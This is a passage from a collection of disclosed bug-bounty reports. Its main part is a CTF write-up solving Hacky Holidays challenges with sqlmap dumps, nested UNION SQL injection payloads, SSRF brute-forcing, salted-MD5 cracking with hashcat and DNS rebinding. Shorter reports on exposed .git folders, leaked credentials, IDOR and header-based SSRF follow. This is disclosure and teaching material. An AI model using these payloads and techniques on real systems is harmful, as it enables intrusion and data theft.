- The parameter `--prefix` is really helpful here because I already figured out how the query is formed, so I'm basically helping sqlmap figure things out faster.
- I've been looking for this one for a while now. The parameter `--technique` forces the technique used to be Boolean / Time Based / Union / etc. In this case, it's set to Boolean.
- The parameter `--second-url` is where the actual magic happens. Because the request is sent to one endpoint and the result from the vulnerable query happens on another, I used this parameter to point to that page.
- The parameter `--string` is a little bit tricky. Sqlmap didn't figure out on its own about how things are changing on that page for successful queries. *I don't blame you. I blame myself.* I figured I could help a little by pointing out the right phrase for a successful query. Note: The name has to be unique, but it has to be used one more time on another session. Because if it's not used at all, it will result in **0**. And if I would have used **test**, that name might have gained more people.
- The parameter `--proxy` is so that I can see everything in Burp Suite.
- The parameter `--save` is really important because it saves all those commands in a config file that can later be referenced when dumping the database.

Let's start talking business.

```bash
> sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
    --data="name=nytr0gen" \
    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
    --drop-set-cookie --ignore-redirects \
    -p name --dbms=mysql --prefix="'" \
    --technique=B \
    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
    --string="is 1 other" \
    --proxy="http://localhost:8080/" \
    --save=$PWD/quiz.conf

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.12#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=nytr0gen' AND 5126=5126 AND 'JwkO'='JwkO
---
back-end DBMS: MySQL >= 8.0.0
```

With the payload discovered by sqlmap and the config file saved, I can run the next couple of commands more easily. I need to get the current database, then the tables of the database, then the columns of my target table, and finally the rows.

```
> sqlmap -c $PWD/quiz.conf --current-db
current database: 'quiz'

> sqlmap -c $PWD/quiz.conf -D quiz --tables
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

> sqlmap -c $PWD/quiz.conf -D quiz -T admin --columns
Database: quiz
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| password | varchar(250) |
| username | varchar(250) |
+----------+--------------+

> sqlmap -c $PWD/quiz.conf -D quiz -T admin --dump
Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```

Nice! It took a bit to get these all out. In retrospection, I could've scripted it :)))

Using the username and the password gets me inside the Admin Area, which contains the flag.

{F1139768}

I am close! The Grinch must be scared. Only a few days until Christmas.

# Challenge X - Signup Manager 💾

{F1139777}

Analyzing the application and running directory bruteforce. Not much to be seen. It's a simple application for applying to the Grinch Evil Army! I guess the quiz must have been taken into consideration for this application.

{F1139774}

Something interesting I noticed in the source code is a comment to **See README.md for assistance**. I hastily accessed `https://hackyholidays.h1ctf.com/signup-manager/README.md` and was met with the following file.

{F1139775}

My next move was to download `signupmanager.zip`. Oh, and the default login didn't work. That would have been too easy :)))

```
> wget 'https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip'
Connecting to hackyholidays.h1ctf.com (hackyholidays.h1ctf.com)|18.216.153.32|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4118 (4.0K) [application/zip]
Saving to: 'signupmanager.zip'

> unzip signupmanager.zip
Archive:  signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```

To spare the unnecessary details for the story, only **index.php** was interesting from all of these.

```php
<?php
// -- snip --
function addUser($username, $password, $age, $firstname, $lastname) {
    $random_hash = md5(print_r($_SERVER, true) . print_r($_POST, true) . date("U") . microtime() . rand());
    $line = "";
    $line .= str_pad($username, 15, "#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad($age, 3, "#");
    $line .= str_pad($firstname, 15, "#");
    $line .= str_pad($lastname, 15, "#");
    $line .= "N";
    $line = substr($line, 0, 113);
    file_put_contents("users.txt", $line . PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers(); // parses users.txt
$page = "signup.php";
// -- snip --
if ($page == "signup.php") {
    $errors = array();
    if (isset($_POST["action"])) {
        // -- snip --
        if ($_POST["action"] == "signup" && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["username"]), 0, 15);
            if (isset($all_users[$username])) {
                $errors[] = "Username already exists";
            }
            $password  = md5($_POST["password"]);
            $firstname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["firstname"]), 0, 15);
            $lastname = substr(preg_replace("/([^a-zA-Z0-9])/", "", $_POST["lastname"]), 0, 15);
            if (!is_numeric($_POST["age"]) || strlen($_POST["age"]) > 3) {
                $errors[] = "Age entered is invalid";
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie("token", $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once $page;
```

This is the important part of the code.

So, the `addUser` function and how it works makes me think of a Content Injection attack. This kind of vulnerability is really hard to notice, especially without source code review. I have written in the past a writeup for [a similar challenge from Google CTF](https://nytr0gen.github.io/writeups/ctf/2018/07/08/google-ctf-2018-quals.html#bookshelf-writeup), which I believe has an interesting scenario and is worth reading.

My goal is to have a **Y** in the admin column.

Ok, but HOW? Username, First Name, and Last Name are all restricting characters. Password is using MD5 Hashing, which is fixed-length to 32 characters. Age? It's a number.

I've taken it all in, then chased my tail for a few hours until I figured out how this can be attacked.

Well, I finally did a Google search for [`intval`](https://www.php.net/manual/en/function.intval.php) and found out it accepts a bunch of stuff, not only digits. The interesting thing is that it accepts and transforms Scientific E notation. For example: `1e1 == 10`, `1e2 == 100`, `1e3 = 1000`. So, the age is limited to 3 chars, but with this, it can be as long as 10 characters. I didn't want to abuse my newfound powers, so I only used `1e3` to push the line by one character. Anything from `1e3` to `1e9` will work here. I intercepted the request in Burp and manually changed the value of the age.

- Username: nytr0gen
- Password: test
- Age: **1e3**
- First Name: test
- Last Name: **YYYYYYYYYYYYYYY**

Registered with these credentials and got the flag. Also, a link to the next step at [/r3c0n_server_4fdk59](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59)

{F1139772}

# Challenge XI - Recon Server 💉🤯

The Grinch has been tracking Santa Claus for the last few years, trying to locate his secret workshop. I've gained access to the server that hosts the photo albums. Let's take a look [inside](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59)!

{F1139780}

It's strange that the picture link looks like this [https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpb...](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9). That's a Base 64. A juicy one.

```js
> echo 'eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzEzZDc0NTU0YzMwZTEwNjk3MTRhNWE5ZWRkYThjOTRkLmpwZyIsImF1dGgiOiI5NGZiMzk4ZDc4YjM2ZTdjMDc5ZTc1NjBjZTlkZjcyMSJ9' | base64 -d | jq
{
  "image": "r3c0n_server_4fdk59/uploads/13d74554c30e1069714a5a9edda8c94d.jpg",
  "auth": "94fb398d78b36e7c079e7560ce9df721"
}
```

Trying to view that image directly will result in an error. That means I really need this JSON.

Changing anything in the **auth** parameter resulted in an error. The same for the **image** parameter. That means the **auth** parameter is a verification hash for the image.

I didn't really want to try to bruteforce that hash :)) That's basically the last measure.

I did a directory bruteforce that uncovered some stuff.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ' -w $COMMONDIR -mc all -fc 404
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
api/experiments         [Status: 401, Size: 64, Words: 9, Lines: 1]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
```

I know `picture` and `uploads`. But **api** is new. Note: `/api/experiments` is a false positive because `/api/anythingandeverything` will respond with `401` as well.

{F1139776}

These look interesting, but from my point of view, I keep getting `401` and `404`—possibly randomly :)). I did bruteforce with bigger lists, bruteforcing parameters, looked for hidden comments, searched for GitHub leaks.

I realized I might not have given enough attention to the `/album?hash=jdh34k`. I tried the classic single quote and double quote, hopeful that I can trigger an error. Nothing. What about `jdh34k' and 1='1`. This incredibly worked.

Now I wanted to get this one by hand, just because I spent so much figuring out sqlmap for the other challenge, I was tired of it. I've gone old school. There's this [really nice tutorial](https://medium.com/bugbountywriteup/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5) that might be helpful to follow along.

| Payload | Status Code |
| ------- | :---------: |
| jdh34k' and 1='1 | 200 |
| jdh34k' and 1='0 | 404 |
| jdh34k' and 1='1';-- | 200 |

This one looks like it might be possible to output the results with `UNION`. The first step is to determine the number of columns with `ORDER BY`. The payload is `jdh34k' order by 3;--`. Then use UNION to see the possible outputs. Final payload is `jdh34k' and 1=0 union all select 1,2,3;--`.

{F1139782}

I noticed here that only the **3** is reflected on the page. Maybe the other two parameters are used for some stuff. Also, there are 2 photos on the page. If I change the 1 to a 2 or a 3, the number of photos will change as well. Anything else, and the photos will disappear.

I finally gave in and used sqlmap to have a better understanding of what I'm dealing with. I dumped everything. Using the data I got, I built the following diagram:

{F1139778}

Following the diagram, the vulnerable query should look something like this:

```sql
SELECT id, hash, name
FROM album
WHERE hash = '$input_hash'
```

Something also noteworthy from the diagram is that the `auth` parameter is not in the database. That means it might be generated at runtime? This gives me hope for a [Server Side Request Forgery](https://portswigger.net/web-security/ssrf) attack.

Going forward, I already figured out that the `hash` column might be useless. And in my mind, the `id` was somehow used to get these photos. And maybe that photos query is vulnerable as well. Tried the same payload, `1' and 1='1`, and I got the same number of photos. Tried `1='0`, and I got no photos as a result. LOL! This will be tough!

So basically, my initial payload was `jdh34k' and 1=0 union all select 1,2,3;--`, and the vulnerable parameter is 1. So the new payload is `jdh34k' and 1=0 union all select "1' and 1='1",2,3;--`... That's sick!

For simplicity, the table of payloads from below will include only the vulnerable parameter from inside:

| Payload | Num of Photos |
| ------- | :-----------: |
| 1' and 1='1 | 2 |
| 1' and 1='0 | 0 |
| 1' order by 3;-- | 2 |
| 1' order by 4;-- | 0 |
| 1' and 1=0 union all select 4,5,6;-- | 1 |

The plot thickens. The final payload is [`jdh34k' and 1=0 union all select "1' and 1=0 union all select 4,5,6;--;--",2,3;--`](https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k'+and+1%3d0+union+all+select+"1'+and+1%3d0+union+all+select+4,5,6%3b--%3b--",2,3%3b--). That's a handful!

The photo that appears has the image set to `r3c0n_server_4fdk59/uploads/6` with a valid auth. I got this!

{F1139781}

Just for the fun of it, the query for getting the photos should be something like:

```sql
SELECT id, album_id, photo
FROM photos
WHERE album_id = '$result_album_id'
```

And a Path Traversal should be possible from this point with `../`. I already know I should be targeting `/api`. Only need to write a proper script to make the requests.

And I did. The script can be seen by downloading {F1139742}. I ran it once with the common wordlist, noticed a bunch of `Expected HTTP status 200, Received 404`, filtered these out, ran it again.

```bash
> python brute_dirs.py
/api/ping - Invalid content type detected
/api/user - Invalid content type detected
```

It seems that for status code 200, it will not show the result unless the Content-Type matches the one of an image. This is unfortunate, and my SSRF seems to be a Blind SSRF. But maybe status codes will suffice.

Let's try to find parameters, I guess. For `/api/ping`, I didn't find a thing. But for `/api/user`, the gods favored me. The parameters are taken from `burp-parameter-names.txt` wordlist from SecLists. Oh, and the script is a bit modified {F1139743}.

```bash
> python brute_params.py
/api/user?username=test - Expected HTTP status 200, Received: 204
/api/user?password=test - Expected HTTP status 200, Received: 204
```

I found the parameters to be **username** and **password**. And they do seem to work separately. My intuition tells me that if this endpoint was meant for internal usage, it should be working as a search. The first thing I tried is if the endpoint was accepting wildcards (`%` and `_`). More details about this type of query in [this article about SQL LIKE operator](https://www.w3schools.com/sql/sql_like.asp).

I tried some requests by hand (with the help of my script to sign it). *Note: The percent sign `%` is URL encoded in the table below as `%25`.*

| URL | Response |
| --- | -------- |
| /api/user?username=**test** | Expected HTTP status 200, Received: 204 |
| /api/user?username=**%25** | Invalid content type detected |
| /api/user?username=**a%25** | Expected HTTP status 200, Received: 204 |
| /api/user?username=**g%25** | Invalid content type detected |
| /api/user?username=**gr%25** | Invalid content type detected |

Yes! My theory of the internal user search is valid. I changed the script a little bit and ran it. Final changes can be seen by downloading {F1139741}.

```bash
> python brute_credentials.py username
g
gr
gri
grin
grinc
grinch
grincha
grinchad
grinchadm
grinchadmi
grinchadmin

> python brute_credentials.py password
s
s4
s4n
s4nt
s4nt4
s4nt4s
s4nt4su
s4nt4suc
s4nt4suck
s4nt4sucks
```

The credentials are:

- Username: **grinchadmin**
- Password: **s4nt4sucks**

And the next step seems to be the login page at https://hackyholidays.h1ctf.com/attack-box/login. Using the credentials I found, I got access to the Grinch Network Attack Server. I finally feel like I have a chance to stop the bad guy!

{F1139779}

# Challenge XII - Attack Box 💣

{F1139799}

This is it! The final battle! Will the Grinch succeed in destroying Christmas for everyone? Or will I be able to save Santa's servers? Keep watching!

With the credentials found in the previous challenge, I was able to login to Grinch Network Attack Server. Here I can see 3 IP Addresses and buttons to attack them. These IPs must be Santa's key servers.

{F1139788}

The flow of the application is the following:
1. Fixed IP Addresses are presented with a base64 payload for the attack.
2. Clicking on any of them will load [/launch?payload=eyJ0...](https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==). Each server has a unique IP address and a unique hash inside that Base64 encoded JSON.
3. The launch endpoint will generate an unique hash for the attack. In my preview that is [/launch/cc2f348ccc3d7d77db26a344910f7150](https://hackyholidays.h1ctf.com/attack-box/launch/cc2f348ccc3d7d77db26a344910f7150).
4. This page makes JSON requests to [/launch/cc2f348ccc3d7d77db26a344910f7150.json?id=0](https://hackyholidays.h1ctf.com/attack-box/launch/cc2f348ccc3d7d77db26a344910f7150.json?id=0) to check for new updates, keeping count of the last ID.

And that's about all there is here. I tried directory bruteforcing and everything else I could think of.

There are two inputs I see here that can be abused.

The first potential input is the **id** parameter on the API endpoint. I tried SQL Injection again, but no luck this time. What about [IDOR](https://portswigger.net/web-security/access-control/idor), an access control vulnerability? Nope. I gave up on this one.

The base64 encoding looks juicy. And it proved in the past to bring some results.

```js
> echo 'eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==' | base64 -d | jq
{
  "target": "203.0.113.33",
  "hash": "5f2940d65ca4140cc18d0878bc398955"
}
```

That hash is bound to the target. Similar to the previous challenge. But I don't see a way to generate them this time around.

Maybe the hash is generated after the host is resolved? I'm thinking that if I use an A record on a domain, resolving to `203.0.113.33`, it may check the hash only after resolving the DNS.

There's this interesting service that I use from [alf.nu/DNS](https://alf.nu/DNS). To have an A record for that IP, I must simply use `203-0-113-33.4i.am`. I tried, and the response was `Invalid Protection Hash`.

I tried spaces before and after the IP address, I tried converting the IP to a bunch of weird formats at [vultr.com/resources/ipv4-converter/](https://www.vultr.com/resources/ipv4-converter/?ip_address=203.0.113.33). I was about to give up. I actually went to sleep early that day because I had no more ideas to break this up.

Then the idea came to me. As if I was getting inspiration from a higher power. Woke up with the energy to break this apart!

So the protection hash is using [MD5](https://en.wikipedia.org/wiki/MD5). Easy to spot because it's kind of the only hash with 32 characters hexadecimal. *Side Note: SHA1 has 40 characters hexadecimal. This might come in handy.*

And the hash is possibly salted or transformed in some way. Because `md5("203.0.113.33") != "5f2940d65ca4140cc18d0878bc398955"`. And the tools I used in one of the previous challenges couldn't find a match for any of the three hashes.

My idea was that the hash might be built in one of the following ways:

- `md5("203.0.113.33" + "RANDOM_WORD")`
- `md5("RANDOM_WORD" + "203.0.113.33")`

I read [this nice tutorial](https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/) about cracking salted MD5 and went to work. Oh, let's not forget the important part, I downloaded the `rockyou.txt` wordlist from [github.com/brannondorsey/naive-hashcat/releases/](https://github.com/brannondorsey/naive-hashcat/releases/).

I created a file with the 3 hashes I found and their corresponding IPs. I added a test hash to be sure that everything worked properly and saved them as `hashes.txt`.

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
05a671c66aefea124cc08b76ea6d30bb:test
```

I ran two hashcat commands, each one for a different hash+salt scheme.

```bash
> hashcat -m 20 -a 0 hashes.txt ./rockyou.txt
hashcat (v6.1.1) starting...

Hashes: 4 digests; 4 unique digests, 4 unique salts

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384

05a671c66aefea124cc08b76ea6d30bb:test:test

Session..........: hashcat
Status...........: Exhausted
Hash.Name........: md5($salt.$pass)
Hash.Target......: hashes.txt
Guess.Base.......: File (./rockyou.txt)

> hashcat -m 10 -a 0 hashes.txt ./rockyou.txt
hashcat (v6.1.1) starting...

Hashes: 4 digests; 4 unique digests, 4 unique salts

Dictionary cache hit:
* Filename..: ./rockyou.txt
* Passwords.: 14344384

5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5($pass.$salt)
Hash.Target......: hashes.txt
Guess.Base.......: File (./rockyou.txt)
```

That went smooth. The Protection Hash is MD5 salted with the word `mrgrinch463`.

The complicated part comes with encoding everything. I have to base64 encode a JSON with a variable target and an MD5 based on that target and a salt. Easy peasy, that's like 5 steps :)). I was thinking of using CyberChef, but I also realized I never used [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) before. What's there to lose?

I was really impressed with the diversity of options and how intuitive it is to use. I built an encoding in the extension's interface, tested it to see if the output matches what I need, then used the encoding input into Burp Repeater to test different targets because the extension encodes the stuff automagically while sending the request.

{F1139785}

Believe me, I tried to use IP addresses that I control in there, and I didn't get any ping from the Grinch Network Attack Server. It seems like it is not yet working. Maybe it's in Demo Mode at the moment. I don't know. It doesn't seem to bring down Santa's servers either. It means I still have time.

It does resolve DNS. If I input a domain name, it gets resolved. Using [requestbin.net/dns](http://requestbin.net/dns), I can see a hit from AWS IPs, but nothing interesting there.

{F1139786}

The mission is to "find a way to stop the Grinch from launching the Denial of Service attack". What if I try to DDOS the Grinch's server.

I can do that by launching an attack to `localhost`.

{F1139787}

This was not about to be that easy! One thing I noticed is that in the response, there are two places where the domain name is resolved. If the domain name has two A records, the first resolve will point to one record, and the second resolve will point to the other one! That could be useful because the `localhost` check seems to be made after the first resolve.

This is tricky to get right. Sometimes it works on the first try. Sometimes it needs 10-20 retries. But it eventually works.

I used [alf.nu/DNS](https://alf.nu/DNS) for this one with the following payload `1s.203-0-113-33.but-50-pct.127-0-0-1.4i.am`.

{F1139783}

Luckily, it worked the first time. I've taken down Grinch Networks and saved the holidays!

{F1139784}

# Ending Notes 📜

This CTF has exceeded all my expectations. I expected some chill and easy challenges for the holidays and met hardcore vulnerabilities from very creative organizers. And I finally had the opportunity to understand how to use sqlmap the right way!

It's been a fantastic CTF. I'm grateful for the amazing creators of the challenge. And in this *interesting* year, I'm grateful to have spent time with my family over the holidays!

Oh, one more thing! I thought I was saving Christmas alone this holiday season. I found out, after I finished the challenge, that I am never alone. A lot of people went after the Grinch on the [Hacker101 Discord](https://www.hacker101.com/discord).

In the end, I'd like to thank the Grinch for helping all of us appreciate more this time of the year!

{F1139791}

## References

- https://www.acunetix.com/blog/articles/blind-xss/
- https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html
- https://en.wikipedia.org/wiki/MD5
- https://en.wikipedia.org/wiki/Universally_unique_identifier
- https://alf.nu/DNS
- https://gchq.github.io/CyberChef/
- https://github.com/brannondorsey/naive-hashcat/releases/
- https://github.com/danielmiessler/SecLists
- https://github.com/ffuf/ffuf
- https://github.com/s0md3v/Arjun
- https://github.com/sqlmapproject/sqlmap/wiki/Usage
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://dbdiagram.io/home
- https://medium.com/bugbountywriteup/identifying-exploiting-sql-injection-manual-automated-79c932f0c9b5
- https://nytr0gen.github.io/writeups/ctf/2018/07/08/google-ctf-2018-quals.html#bookshelf-writeup
- https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100
- https://portswigger.net/burp/communitydownload
- https://portswigger.net/support/using-sql-injection-to-bypass-authentication
- https://portswigger.net/web-security/access-control/idor
- https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/ssrf
- http://requestbin.net/dns
- https://robinverton.de/blog/2012/07/15/cracking-salted-md5-with-hashcat/
- http://sqlmap.org/
- https://www.hacker101.com/discord
- https://www.openwall.com/john/
- https://www.php.net/manual/en/function.intval.php
- https://www.vultr.com/resources/ipv4-converter/
- https://www.w3schools.com/sql/sql_like.asp
- https://xsshunter.com/

## Impact

.

---

### [exposed Git Repo at http://api.e2e-kops-aws-canary.test-cncf-aws.canary.k8s.io/.git/](https://hackerone.com/reports/970520)

- **Report ID:** `970520`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Kubernetes
- **Reporter:** @zevfw5pp
- **Bounty:** - usd
- **Disclosed:** 2021-01-07T18:33:23.911Z
- **CVE(s):** -

**Vulnerability Information:**

Dear Security team,

If this report is out of scope,  please let me know and I will close the report myself

I found a git repository on http://api.e2e-kops-aws-canary.test-cncf-aws.canary.k8s.io/.git/.git. This endpoint allows an attacker to retrieve much of the source code and git history for this service which could potentially reveal sensitive information, it all depends what is stored there.

Example:
http://api.e2e-kops-aws-canary.test-cncf-aws.canary.k8s.io/.git/logs/HEAD
http://api.e2e-kops-aws-canary.test-cncf-aws.canary.k8s.io/.git/config
Mitigation
The restrict access (403 forbidden) are enabled only on /.git and not their subfolders. You just need to add all the git subfolders to the same rule.


Best Regards,
Daniel

## Impact

An attacker can get information just dumping data using  .git repository.

---

### [Admin Reseller Account Disclosure](https://hackerone.com/reports/879562)

- **Report ID:** `879562`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** 8x8
- **Reporter:** @stilou
- **Bounty:** - usd
- **Disclosed:** 2020-12-15T22:34:54.339Z
- **CVE(s):** -

**Summary (team):**

The vendor that handles 8x8 Resellers had inadvertently exposed account credentials. The information was removed and credentials changed.

**Summary (researcher):**

Leaked admin account of third party reseller in github with full access to all files.

---

### [Able to comment/view in others support ticket at https://en.instagram-brand.com/requests/dashboard](https://hackerone.com/reports/1007988)

- **Report ID:** `1007988`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Automattic
- **Reporter:** @cryptordx
- **Bounty:** - usd
- **Disclosed:** 2020-12-05T13:21:03.579Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
I reported the vulnerability to Facebook, and they have said to report it here for the bounty. 

## Platform(s) Affected:
 https://en.instagram-brand.com/requests/dashboard
## Steps To Reproduce:
1. Create two account User A, User B at https://en.instagram-brand.com/
2. Apply for Instagram brand from https://en.instagram-brand.com/requests/dashboard by User A
3. Login to user B and intercept the request

4.Send a post request with cookie and other header got by intercepting user B in the below endpoint and replace comment 44799 with User A support ticket id 
POST /wp-json/brc/v1/approval-requests/44799/comments HTTP/1.1
text=sure thanks&files=1597287925578-44741-%3Etest.jpg&sizes=4249

## Supporting Material/References:

video POC - https://drive.google.com/file/d/1My6MQuQTmYwCWQw_7uw1veGFkn13WkDP/view?usp=sharing
screenshot of viewing other's messages - https://drive.google.com/file/d/1WnDGPDHGA6pP9RIPBQpEAIXxPTaFJZVX/view?usp=sharing&fbclid=IwAR3k4cEfCcUcfBKhlffQgjDcy4ASRf7V3fsS7FmZcHyyd_HZZfFk1OlDpf8

## Impact

1) can comment in other's support ticket
2) can view other's support ticket comments (Both Instagram as well as user's)

---

### [Leaked DB credentials on https://██████████.mil/███](https://hackerone.com/reports/761790)

- **Report ID:** `761790`
- **Severity:** Critical
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @al-madjus
- **Bounty:** - usd
- **Disclosed:** 2020-12-03T21:32:20.836Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Information disclosure with login credentials for ms-sql database exposed. 

**Description:**
I've found a PHP info file disclosed on https://█████.mil/██████ containing login credentials for a database cloud server (███████) as well as information on the host system such as hostname, username and full paths. The database server is up, but I have not tried connecting to it with the credentials, as I feel that would be going too far. 

## Impact
Possible access to database as well as disclosure of sensitive host information. 

## Step-by-step Reproduction Instructions

1. Go to https://██████████.mil/████████
2. Search for 'password', you should see this: 
    `Data Source=tcp:███,█████████;Initial Catalog=██████████;User  Id=████@██████████;Password=███████ `
3. Run `nc -vvv █████████ █████` to confirm database is running and service ms-sql-s is accepting connections: 
`(UNKNOWN) [███████] ████████ (ms-sql-s) open
^C sent 0, rcvd 0
`

## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions
███████ should not be available on the server.

## Impact

Possible access to database as well as disclosure of sensitive host information.

---

### [Unauthorized user is able to access schedule pipeline variables and values](https://hackerone.com/reports/962462)

- **Report ID:** `962462`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** GitLab
- **Reporter:** @vaib25vicky
- **Bounty:** - usd
- **Disclosed:** 2020-11-30T23:17:21.193Z
- **CVE(s):** CVE-2020-13351

**Vulnerability Information:**

### Summary

The feature allows to add or overwrite variables that are passed to jobs  in order to modify the behavior just for that specific instance.
 
As per this https://gitlab.com/gitlab-org/gitlab-foss/-/issues/32568#note_32531510 , the current security model is
>If you are owner of schedule (as developer) or master => you can read, modify and delete,
If you are developer => you can just list, not read,

>This allows only owners and masters to read variables assigned to the schedule. It prevents other developers from hijacking schedules, but allows master to fully control them. Master already has access to Secret Variables.

But api endpoints are cleary showing this values to everyone even if the user is not part of the project. https://docs.gitlab.com/ee/api/pipeline_schedules.html#get-a-single-pipeline-schedule


### PoC

This is my test project https://gitlab.com/thevicc/trigg with schedule pipeline which custom variables you can't read.

Now, run this to read the variable and its value

`curl  --header "Private-Token: <your_access_token>"  https://gitlab.com/api/v4/projects/20618145/pipeline_schedules/69918`

Response
{F955402}

### Steps to reproduce

* Create a project and add a schedule pipeline with custom variables
*  Only you or owner can read variables
* As second account, use the api `https://docs.gitlab.com/ee/api/pipeline_schedules.html#get-a-single-pipeline-schedule`

## Impact

This bug allows unauthorized users to read scheduled pipeline custom variables and values. As per security model, this allows other devs to hijack schedules.

---

### [Access to multiple production Grafana dashboards](https://hackerone.com/reports/663628)

- **Report ID:** `663628`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** Snapchat
- **Reporter:** @damian89
- **Bounty:** 10000 usd
- **Disclosed:** 2020-11-04T11:24:25.261Z
- **CVE(s):** -

**Summary (team):**

@damian89 found a production Grafana instance which displayed confidential metrics inside various dashboards.

**Summary (researcher):**

While fuzzing patterns of certain snapchat related projects, I was able to find an instance of Grafana which was accessible by a guest user. That instance contained hundreds of production dashboards, valuable data about company. Furthermore one of the custom modules was vulnerable to SQL Injection.

---

### [External Service Interaction | https://█████████.mil](https://hackerone.com/reports/997988)

- **Report ID:** `997988`
- **Severity:** High
- **Weakness:** Information Disclosure
- **Program:** U.S. Dept Of Defense
- **Reporter:** @x3ph_
- **Bounty:** - usd
- **Disclosed:** 2020-10-16T19:45:01.388Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

I am able to trick web server ███████.mil into making DNS and HTTP requests to my vps server and burp collaborator.

Walkthrough Section:

1. Create an account using the registration form https://████████.mil/█████/accounts/register/

███████

2. Provide the required information to create a POST request.

████████

3. Intercept the request and add the following headers below and add your external webserver. You will have the ability to send requests as the web server as a proxy.

X-Forwarded-Host: <ExternalWebServer>
X-Host: <ExternalWebServer>
X-Forwarded-Server:  <ExternalWebServer>

███

█████

4. I am able to confirm I received not only DNS Requests but also HTTP requests from ██████████.mil. I have also attached a spreadsheet that shows every request i made and what IP address they originated from. The screen shot below on the left window is my burp collaborator you can see the log of interactions. On the right is my vps server.. I setup my HTTP Server and i made multiple requests from that webserver, you can see the interaction as well.

████████

## Impact

The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.

## Step-by-step Reproduction Instructions

1. Navigate to https://██████.mil/███/accounts/register/?██████████
2. Following the walkthrough section above

## Suggested Mitigation/Remediation Actions

If this is intended behavior you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.

